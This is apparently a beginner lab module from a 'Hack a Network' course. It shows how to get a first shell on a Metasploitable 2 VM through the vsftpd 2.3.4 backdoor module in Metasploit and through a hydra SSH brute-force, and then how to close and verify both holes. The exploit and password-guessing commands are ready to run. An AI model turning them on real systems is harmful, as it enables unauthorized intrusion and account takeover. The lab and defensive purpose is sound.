---
title: "Hack a Network - 02: Foothold (first shell on msf2)"
---

# Hack a Network - 02: Foothold (first shell on msf2)

> Part of the **"Hack a Network"** journey. Everything here runs against **VMs we own** on the
> **isolated `10.13.37.0/24` lab network** with no route to any real network or the internet. This is
> defensive-security self-study: we attack our own machine to learn to defend it.

| | |
|---|---|
| **Goal** | Get a first shell on `msf2` two ways: a classic service exploit via Metasploit, and a weak-credential SSH login via a brute-force. Then orient yourself on the box. |
| **Target(s)** | `msf2` - Metasploitable 2, `10.13.37.20`. |
| **Difficulty** | Beginner |
| **Est. time** | 45-60 min |
| **Prereqs** | **Module 00** (host map) and **Module 01** (you have the version list and know `vsftpd 2.3.4` and weak SSH creds are the ways in). |
| **Start from** | `virsh -c qemu:///system start msf2`. If you ran the module 01 defenses, first restore the vulnerable baseline: `virsh -c qemu:///system snapshot-revert msf2 clean-baseline`. Attacker: `virsh -c qemu:///system start kali`. |

**MITRE ATT&CK**
- Initial Access / Exploit Public-Facing Application - **T1190**
- Credential Access / Brute Force: Password Guessing - **T1110.001**
- Initial Access / Valid Accounts - **T1078**
- Execution / Command and Scripting Interpreter: Unix Shell - **T1059.004**

---

## Background: a foothold is the first shell

Enumeration (module 01) found two clear doors into `msf2`:

1. A **vulnerable service**: `vsftpd 2.3.4`, which shipped with a backdoor. This is the classic,
   fully documented Metasploitable 2 exploit, and we drive it with Metasploit (`msfconsole`).
2. **Weak credentials** on SSH, which we crack with `hydra` and then log in with normally.

Both give a shell. We do both so you see the two archetypes: **exploit a flaw** versus **abuse a weak
password**. All commands run **from `kali`** against `10.13.37.20`.

---

## Path A - service exploit: vsftpd 2.3.4 backdoor (via Metasploit)

### 1. Start Metasploit

```
msfconsole -q
```

Launches the Metasploit console (`-q` skips the banner). Metasploit is a framework of ready-made exploit
modules; you pick one, set its options, and run it.

**What you should see:** an `msf6 >` prompt. First run may take a moment to load.

### 2. Select the exploit module

```
use exploit/unix/ftp/vsftpd_234_backdoor
```

Loads the module that abuses the vsftpd 2.3.4 backdoor. Sending a username ending in `:)` makes the
backdoored daemon open a root command shell on port 6200; the module does this and connects to it.

**What you should see:** the prompt changes to `...(vsftpd_234_backdoor) >`.

### 3. Point it at the target and check options

```
set RHOSTS 10.13.37.20
show options
```

`RHOSTS` is the target address. `show options` lists what the module needs, so you can confirm nothing
else is required.

**What you should see:** `RHOSTS => 10.13.37.20`, then a table where `RHOSTS` is now `10.13.37.20` and
`RPORT` is `21`. No other required field should be blank.

### 4. Fire the exploit

```
run
```

Runs the module: it triggers the backdoor and hands you the shell it opens.

**What you should see:** lines like `Banner: 220 (vsFTPd 2.3.4)`, then `Backdoor service has been spawned`
and `Command shell session 1 opened`. You now have a raw shell (no prompt). Type a command and press
Enter to test it (see orientation below). This shell is already **root**.

---

## Path B - weak credentials: brute-force SSH with hydra

Do this in a **second Kali terminal** (leave Metasploit open in the first).

### 5. Build a small username and password list

```
printf 'msfadmin\nuser\nservice\nroot\n' > ~/users.txt
gunzip -kc /usr/share/wordlists/rockyou.txt.gz | head -n 2000 > ~/pw-short.txt
grep -qxF msfadmin ~/pw-short.txt || echo msfadmin >> ~/pw-short.txt
```

Creates a short list of likely usernames, then unzips the first 2000 lines of the `rockyou` wordlist into
a small password list (`-k` keeps the original `.gz`, `-c` writes to stdout). The last line makes sure
`msfadmin` (the known weak password) is in the list, so the demo is fast and deterministic.

**What you should see:** two files in your home directory. `wc -l ~/pw-short.txt` reports about 2001
lines.

### 6. Run the brute-force against SSH

```
hydra -L ~/users.txt -P ~/pw-short.txt -t 4 -f ssh://10.13.37.20
```

`hydra` tries each username/password pair against the SSH service. `-L` is the username list, `-P` the
password list, `-t 4` uses 4 parallel tries (gentle, the old SSH daemon is slow), `-f` stops at the first
valid login.

**What you should see:** progress output, then a green `[22][ssh] host: 10.13.37.20  login: msfadmin
password: msfadmin`. That is a cracked credential: a real account with a guessable password.

### 7. Log in with the cracked credentials

```
ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-rsa msfadmin@10.13.37.20
```

Logs in as the account you just cracked. The extra `-o` options re-enable the legacy key-exchange and host-key
algorithms that modern OpenSSH disables by default, because msf2's 2008-era SSH only speaks those. Enter
`msfadmin` when prompted for the password.

**What you should see:** a shell prompt like `msfadmin@metasploitable:~$`. You are in as a normal user
(root is one `sudo` away, since `msfadmin` has sudo with the same password).

---

## Post-foothold: orient yourself

Whichever shell you landed in, the first thing an attacker (and a defender walking the same steps) does
is answer "who and where am I?". Run these in the shell:

```
whoami        # which account am I running as
id            # my user id, group ids, and any special groups
hostname      # the machine's name
ip addr       # (or: ifconfig) this host's addresses and interfaces
uname -a      # kernel and OS version
```

**What you should see:**
- In **Path A** (Metasploit): `whoami` returns `root` and `id` shows `uid=0(root)`. You have full control.
- In **Path B** (SSH): `whoami` returns `msfadmin` and `id` shows the normal user plus the `admin`/sudo
  group. `hostname` is `metasploitable`; `ip addr` confirms `10.13.37.20`; `uname -a` shows the old
  2.6.24 kernel. This "situational awareness" is what a real intruder gathers before deciding what to do
  next, and what a defender reviews in logs after an incident.

---

## Defense: close the door, then prove it is closed

Two doors, two fixes.

### Fix A - the vulnerable service (patch / remove)

The real-world fix for the vsftpd backdoor is to **run a patched version**; the backdoored 2.3.4 build
was pulled long ago. Metasploitable is a frozen image and cannot be `apt`-updated, so on the box we prove
the equivalent: **if the vulnerable service is not exposed, the exploit fails.** On `msf2`:

```
sudo /etc/init.d/vsftpd stop
sudo iptables -A INPUT -p tcp --dport 21 -j DROP
```

Stops the FTP daemon and drops any inbound connection to port 21.

**Prove fix A:** back in Metasploit (`msfconsole`), re-run the exploit:

```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.13.37.20
run
```

**What you should see:** the module fails to connect, ending with something like
`Exploit completed, but no session was created` (the banner grab times out). No shell. The door is shut.

### Fix B - strong credentials, key auth, and rate-limiting

Weak SSH passwords are the root cause of Path B. Layered fix:

1. **Set a strong, unique password** and prefer **key-based auth** over passwords entirely.
2. **fail2ban** to slow/lock brute-force sources.

On `msf2`, the provable step is to **turn off SSH password authentication** (which is what forces key
auth and instantly defeats a password brute-force). Edit `/etc/ssh/sshd_config`:

```
PasswordAuthentication no
```

then restart SSH: `sudo /etc/init.d/ssh restart`.

> **fail2ban** is the rate-limiting layer that belongs alongside this. msf2's 2012 OS has no offline way
> to install it, so demonstrate fail2ban on the **`blue`** hardening target (`10.13.37.40`, Debian 12,
> `apt install fail2ban`), where after a few failed SSH logins the attacker's IP is banned in iptables
> and hydra stalls. On msf2, disabling password auth is the equivalent, provable defeat of the same
> attack.

**Prove fix B:** re-run the exact hydra command from step 6:

```
hydra -L ~/users.txt -P ~/pw-short.txt -t 4 -f ssh://10.13.37.20
```

**What you should see:** hydra tries every pair and finds **nothing** (no green `login:` line, it reports
0 valid passwords), because the server no longer accepts password logins at all. A manual
`ssh msfadmin@10.13.37.20` is refused with `Permission denied (publickey)`. The credential door is shut.

---

## Flags / evidence captured
- A **root** shell via Path A (Metasploit session, `id` = `uid=0`).
- A cracked credential (`msfadmin:msfadmin`) and an interactive SSH session via Path B.
- The orientation output (`whoami`, `id`, `hostname`, `ip addr`, `uname -a`) recording where you landed.

## Cleanup / reset
Both paths and both fixes change the target. Reset it to the clean, vulnerable baseline when done:

```
virsh -c qemu:///system snapshot-revert msf2 clean-baseline
```

Then close any open Metasploit/SSH sessions on Kali. Delete the scratch lists if you like
(`rm ~/users.txt ~/pw-short.txt`). (Windows targets must be shut down before a revert; msf2 reverts while
running.)

## Go deeper
Research: why does disabling password auth beat hydra but not stop someone with a stolen key? or
run a local model for an interactive session.
